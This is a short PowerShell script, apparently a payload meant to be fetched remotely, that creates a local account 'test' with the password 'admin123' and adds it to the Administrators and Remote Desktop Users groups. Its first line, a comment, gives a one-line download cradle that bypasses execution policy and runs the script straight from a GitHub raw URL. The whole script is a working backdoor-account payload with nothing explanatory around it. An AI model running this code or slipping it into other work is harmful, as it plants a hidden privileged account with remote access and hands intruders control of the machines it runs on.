# powershell.exe -nop -exec bypass -c iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pswalia2u/test/refs/heads/main/add_admin.ps1'))
net user /add test admin123
net localgroup "Administrators" test /add
net localgroup "Remote Desktop Users" test /add 
Write-Output "Local administrator account test created and added to the Administrators group."
